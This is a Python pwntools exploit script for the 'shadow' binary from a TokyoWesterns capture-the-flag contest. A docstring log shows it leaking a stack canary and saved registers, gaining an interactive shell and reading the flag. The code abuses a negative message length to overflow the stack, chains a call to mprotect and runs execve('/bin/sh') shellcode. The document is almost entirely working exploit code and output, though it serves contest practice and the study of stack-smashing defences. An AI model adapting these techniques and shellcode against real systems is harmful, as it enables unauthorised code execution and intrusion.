#!/usr/bin/env python

from pwn import *
import sys

'''
shadow python ./shadow.py pwn2.chal.ctf.westerns.tokyo 18294
[*] For remote: ./shadow.py HOST PORT
[+] Opening connection to pwn2.chal.ctf.westerns.tokyo on port 18294: Done
[*] Canary: 0x37e0a000
[*] Saved EBP: 0xfff894dc
[*] Saved EIP: 0x8048d1b
[*] Some Buff: 0xfff89490
[*] '/vagrant/mma/shadow/shadow'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
[*] Switching to interactive mode
$ ls
flag
shadow
$ cat flag
TWCTF{pr3v3n7_ROP_u51ng_h0m3m4d3_5h4d0w_574ck}
$
'''


def exploit(r):
	r.recvuntil('Input name : ')
	r.sendline("AAAA")
	r.recvuntil('Message length : ')
	r.sendline('-2')
	r.recvuntil('Input message : ')

	payload = 'A' * 0x21

	r.send(payload)
	r.recvuntil('<AAAA> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
	canary = u32("\x00" + r.recv(3))
	log.info("Canary: " + hex(canary))

	r.recvuntil('Change name? (y/n) : ')
	r.sendline('n')
	r.recvuntil('Message length : ')
	r.sendline('-2')
	r.recvuntil('Input message : ')

	payload = "A" * 44
	r.send(payload)
	r.recvuntil('<AAAA> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
	saved_ebp = u32(r.recv(4))
	saved_eip = u32(r.recv(4))
	some_buff = u32(r.recv(4))
	log.info("Saved EBP: " +hex(saved_ebp))	
	log.info("Saved EIP: " +hex(saved_eip))	
	log.info("Some Buff: " +hex(some_buff))	

	r.recvuntil('Change name? (y/n) : ')
	r.sendline('n')
	r.recvuntil('Message length : ')
	r.sendline('-2')
	r.recvuntil('Input message : ')

	payload = "A" * 32
	payload += p32(canary)
	payload += p32(0x42424242)
	payload += p32(saved_ebp)
	payload += p32(0x43434343)
	payload += p32(0x44444444)
	payload += p32(saved_ebp-0x100)	# name ptr
	payload += p32(0x100)						# name length input
	payload += p32(0x500)						# loop counter limit
	r.sendline(payload)

	r.recvuntil('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
#	r.recvuntil('Change name? (y/n) : ')
#	r.sendline('y')
	r.recvuntil('Input name : ')

	e = ELF('shadow')

	sc = (
	    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
	    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	)

	payload = p32(e.plt['mprotect'])
	payload += p32(saved_ebp-0xe8)
	payload += p32(saved_ebp & 0xfffff000)
	payload += p32(0x1000)
	payload += p32(7)
	payload += "\x90" * 0x50
	payload += sc

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/mma/shadow/shadow'])
        print util.proc.pidof(r)
        pause()
        exploit(r)